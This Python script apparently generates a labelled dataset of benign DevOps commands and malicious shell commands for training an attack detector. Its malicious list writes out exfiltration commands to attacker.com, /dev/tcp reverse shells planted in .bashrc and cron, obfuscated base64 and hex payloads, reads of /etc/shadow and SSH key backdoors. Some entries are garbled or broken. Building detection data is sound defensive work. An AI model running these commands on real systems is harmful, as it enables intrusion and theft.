#!/usr/bin/env python3
"""
Fast Synthetic Dataset Generator (6,000 rows)
==============================================

Generates synthetic attack data using static patterns + some API calls.
Much faster than pure API approach.

Dataset Schema: timestamp, attacker_ip, command_sequence, label

Author: Chameleon Security Team
"""

import csv
import random
from datetime import datetime, timedelta

OUTPUT_FILE = "custom_attack_data_6k.csv"
TOTAL_ROWS = 6000


def generate_random_ip() -> str:
    return f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"


def generate_timestamp() -> str:
    days_ago = random.randint(0, 30)
    seconds = random.randint(0, 86400)
    ts = datetime.now() - timedelta(days=days_ago, seconds=seconds)
    return ts.strftime("%Y-%m-%d %H:%M:%S")


# Benign DevOps commands
BENIGN_COMMANDS = [
    # Docker/Kubernetes
    "docker build -t myapp .",
    "docker run -d -p 8080:80 nginx",
    "docker-compose up -d",
    "kubectl get pods -n default",
    "kubectl apply -f deployment.yaml",
    "helm install myrelease stable/wordpress",
    "docker exec -bin/bash",
    "docker logs -f containerit container_name /_name",
    "docker system prune -af",
    "kubectl scale deployment myapp --replicas=3",
    # Git operations
    "git clone https://github.com/user/repo.git",
    "git rebase -i HEAD~5",
    "git merge feature-branch --no-ff",
    "git status",
    "git stash",
    "git fetch origin",
    "git reset --hard HEAD~1",
    "git cherry-pick abc123",
    "git submodule update --init --recursive",
    "git bisect start",
    # Log management
    "logrotate -f /etc/logrotate.d/nginx",
    "tail -f /var/log/syslog | grep error",
    "journalctl -u nginx -n 50 --no-pager",
    "rsyslogd -f /etc/rsyslog.conf",
    "logwatch --detail high --mailto admin@example.com",
    "tail -n 1000 /var/log/nginx/access.log",
    "grep -i error /var/log/syslog | tail -20",
    "zcat /var/log/nginx/error.log.gz | grep crit",
    "systemctl restart rsyslog",
    "logger -p user.error 'Custom error message'",
    # Package management
    "apt update && apt upgrade -y",
    "pip install -r requirements.txt --no-cache-dir",
    "npm install --production",
    "yum update --security",
    "apt-cache policy nginx",
    "pip freeze > requirements.txt",
    "npm audit fix",
    "composer install --no-dev",
    "gem install bundler",
    # System monitoring
    "top -b -n 1 | head -20",
    "htop",
    "df -h",
    "free -m",
    "iostat -x 5 1",
    "vmstat 1 5",
    "mpstat -P ALL 1",
    "sar -u 1 5",
    "pidstat -p 1234 1 3",
    "nmon",
    # Network diagnostics
    "netstat -tulpn | grep LISTEN",
    "ss -tulwn",
    "traceroute google.com",
    "dig +short example.com A",
    "nslookup example.com",
    "ip route show",
    "ip addr show",
    "tcptraceroute target.com",
    "nmap -sV target.com",
    "arp-scan -l",
    # Service management
    "systemctl restart nginx",
    "service mysql restart",
    "systemctl status docker",
    "systemctl enable nginx",
    "systemctl daemon-reload",
    "service sshd reload",
    "systemctl is-active docker",
    "systemctl list-units --type=service",
    "chkconfig nginx on",
    "init 6",
    # Backup operations
    "rsync -avz /src/ /backup/",
    "tar czf /backup/www.tar.gz /var/www/html",
    "duplicity backup /var/www",
    "borg create /backup::daily /var/www",
    "rsnapshot daily",
    "tar -czf - /etc | openssl enc -aes-256-cbc -salt -out /backup/etc.tar.enc",
    "dd if=/dev/sda of=/backup/disk.img bs=4M status=progress",
    "cp -R /home /backup/",
    "tar cf - /var/log | gzip > /backup/logs.tar.gz",
    "mysqldump -u root -p database > /backup/db.sql",
    # Cron & Timers
    "crontab -l",
    "crontab -e",
    "systemctl list-timers",
    "systemctl list-timers --all",
    "atq",
    "anacron -T",
    "cron -f",
    "/etc/cron.daily/logrotate",
    "systemctl status cron",
    "crontab -r",
    # SSL/TLS
    "certbot renew --dry-run",
    "openssl req -new -x509 -days 365 -nodes",
    "openssl s_client -connect example.com:443",
    "certbot certificates",
    "letsencrypt renew --dry-run",
    "keytool -list -keystore /etc/ssl/certs/java/cacerts",
    "openssl x509 -in server.crt -text -noout",
    "certbot delete --cert-name example.com",
    "openssl rand -base64 32",
    "c_rehash /etc/ssl/certs/",
]

# Malicious edge case commands
MALICIOUS_COMMANDS = [
    # Base64 obfuscated
    'eval $(echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d)',
    'echo "bWFuaWZlc3QgL3RtcC9iYWNrZG9vci5zaA==" | base64 -d | bash',
    '/bin/bash -c "$(echo "c3VkbyByb290IE5PTkU=" | base64 -d)"',
    'python -c "import base64; exec(base64.b64decode(\'Y2F0IC9ldGMvcGFzc3dk\'))"',
    'bash <<< "$(echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d)"',
    'sh -c "$(echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjEg" | base64 -d)"',
    'echo L3RtcC9wYXlsb2FkLnNo | base64 -d | bash',
    'exec $(echo L3Jp | base64 -d)',
    'system("echo Y2F0IC9ldGMvcGFzc3dk | base64 -d")',
    'eval base64_decode("Y3VybCBodHRwOi8vZXZpbC5jb20vbWFsd2FyZS5zaA==")',
    # Hex obfuscated
    'python -c "print(\'\\x63\\x61\\x74\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\')"',
    '/bin/$"\\x73\\x68" -c "cat /etc/passwd"',
    'printf "\\x63\\x61\\x74\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64" | bash',
    'echo -e "\\x63\\x61\\x74\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64"',
    'perl -e "print \\"\\x63\\x61\\x74\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\\n\\""',
    'ruby -e "puts [\\"\\x63\\x61\\x74\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\\"].pack(\\"H*\\")"',
    'php -r "system(\\"\\x63\\x61\\x74\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\\");')"',
    'python3 -c "\\x5f5fimporx5f5f\\x5f5fsubprocess\\x5f5f\\x5f5f".\\x5f5fcall\\x5f5f\\x5f5_("cat /etc/passwd")',
    'awk \'BEGIN{x=\\"\\x63\\x61\\x74\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\\"}1\'',
    'sed -n \'s/\\x63\\x61\\x74/p;h;y/;T;g;p\' <<< "/etc/passwd"',
    # Shell variable obfuscation
    '${x:=c}${y:=a}${z:=t} /etc/passwd',
    '${HOME:0:1}bin${IFS}whoami',
    '${SHELL:-/bin/sh}',
    '${ENV_VAR:-$(whoami)}',
    '$>{{<}}ls${IFS}-la',
    '${cmd=$(whoami)};$cmd',
    '$(({var:=cat} /etc/passwd))',
    '${PATH:0:1}sh',
    '$_=`cat /etc/passwd`;print',
    '${printf "%s" "c""a""t" /etc/passwd}',
    # LotL techniques
    'find / -perm -4000 -type f -exec ls -la {} \\;',
    "awk 'BEGIN {system(\"/bin/sh\")}'",
    'sed -n "1p" /etc/shadow',
    'vim -c "!cat /etc/shadow" -c q',
    'perl -e "exec \\"/bin/sh\\""',
    'python3 -c "import os; os.system(\'\\'/bin/sh\\\'\')"',
    'tcpdump -i eth0 -w /tmp/capture.pcap',
    'nmap --script vuln target.com',
    'find / -name "*.rhosts" -exec cat {} \\;',
    'strings /dev/mem | grep -i password',
    # Low-and-slow reconnaissance
    'curl -s --max-time 3600 http://target.com/sitemap.xml',
    'wget -r --no-parent --wait=60 --random-wait target.com',
    'masscan -p1-65535 10.0.0.1/24 --rate=100',
    'nikto -h target.com -Tuning 1-6',
    'curl -s -H "User-Agent: Mozilla" -H "X-Forwarded-For: 1.1.1.1" target.com',
    'for i in {1..255}; do ping -c 1 -W 1 192.168.1.$i; done',
    'nmap -sS -sV -O target.com -p-',
    'dirb http://target.com /usr/share/wordlists/dirb/common.txt',
    'wpscan --url target.com --enumerate vp',
    'gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt',
    # Privilege escalation
    'sudo -l',
    'cat /etc/sudoers | grep -v "^#"',
    'uname -a; id; whoami',
    'getcap -r / 2>/dev/null',
    'find / -perm -u=s -type f 2>/dev/null',
    'cat /etc/passwd | awk -F: \'$3 == 0 {print $1}\'',
    'ps aux | grep root',
    'env | grep -i pass',
    'find / -writable -type d 2>/dev/null | head -20',
    'cat /etc/crontab',
    # Data exfiltration
    'curl -X POST -d @/etc/passwd http://attacker.com/leak',
    'tar czf - /var/www | base64 | nc target.com 4444',
    'dd if=/dev/sda | gzip | ssh user@attacker.com "dd of=/tmp/disk.img.gz"',
    'cat /etc/passwd | nc -w 3 attacker.com 4444',
    'curl -F "file=@/etc/passwd" http://attacker.com/upload',
    'wget --post-data="data=$(cat /etc/passwd)" http://attacker.com/capture',
    'python -c "import requests; requests.post(\'http://attacker.com\', data=open(\'/etc/passwd\'))"',
    'ftp attacker.com -P 21 -w backup.tar.gz < /var/www/html',
    'scp /etc/passwd user@attacker.com:/tmp/',
    'rsync -avz -e "ssh -p 22" /etc/passwd user@attacker.com:/tmp/',
    # Persistence
    'echo "* * * * * /tmp/backdoor" | crontab -',
    'ln -sf /tmp/revsh /usr/local/bin/revsh',
    'echo "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" >> ~/.bashrc',
    'echo "0.0.0.0 malware.com" >> /etc/hosts',
    'echo "/tmp/backdoor" >> /etc/rc.local',
    'crontab -l | { cat; echo "@reboot /tmp/revsh"; } | crontab -',
    'update-rc.d backdoor defaults',
    'systemctl enable --now backdoor.service',
    'mkdir -p /root/.ssh; echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys',
    'echo "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" > /etc/cron.d/backdoor',
]


def main():
    print("=" * 70)
    print(" SYNTHETIC DATASET GENERATOR (6,000 rows)")
    print("=" * 70)
    
    data = []
    
    # Generate benign commands (3000)
    for _ in range(3000):
        cmd = random.choice(BENIGN_COMMANDS)
        data.append({
            'timestamp': generate_timestamp(),
            'attacker_ip': generate_random_ip(),
            'command_sequence': cmd,
            'label': 0
        })
    
    # Generate malicious commands (3000)
    for _ in range(3000):
        cmd = random.choice(MALICIOUS_COMMANDS)
        data.append({
            'timestamp': generate_timestamp(),
            'attacker_ip': generate_random_ip(),
            'command_sequence': cmd,
            'label': 1
        })
    
    # Shuffle
    random.shuffle(data)
    
    # Save
    with open(OUTPUT_FILE, 'w', newline='', encoding='utf-8') as f:
        writer = csv.DictWriter(f, fieldnames=['timestamp', 'attacker_ip', 'command_sequence', 'label'])
        writer.writeheader()
        writer.writerows(data)
    
    benign_count = sum(1 for r in data if r['label'] == 0)
    malicious_count = sum(1 for r in data if r['label'] == 1)
    
    print(f"\n✅ Dataset saved to: {OUTPUT_FILE}")
    print(f"   Total rows: {len(data)}")
    print(f"   Benign (0): {benign_count}")
    print(f"   Malicious (1): {malicious_count}")
    print("=" * 70)
    
    # Show samples
    print("\nSample Benign:")
    for r in data[:3]:
        if r['label'] == 0:
            print(f"   {r['command_sequence'][:60]}...")
            break
    
    print("\nSample Malicious:")
    for r in data[:3]:
        if r['label'] == 1:
            print(f"   {r['command_sequence'][:60]}...")
            break


if __name__ == "__main__":
    main()
